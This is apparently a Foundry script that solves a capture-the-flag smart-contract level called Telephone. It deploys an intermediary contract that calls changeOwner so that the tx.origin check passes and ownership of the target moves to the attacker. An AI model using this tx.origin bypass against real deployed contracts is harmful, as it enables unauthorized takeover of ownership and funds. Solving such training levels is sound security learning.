// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level04.sol";
import "forge-std/Script.sol";

contract ExploitLevel04 is Script {
    Telephone instance = Telephone(0x5B3BBBB08afA2fD125D0dB3c7c455909D11E5F43);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Intermediary intermediary = new Intermediary(instance);
        intermediary.ring();
        vm.stopBroadcast();

        console.log("New owner:", instance.owner());
        // assert(instance.owner() == msg.sender);
    }
}

contract Intermediary {
    Telephone instance;

    constructor(Telephone _instance) {
        instance = _instance;
    }

    function ring() external {
        instance.changeOwner(msg.sender);
    }
}
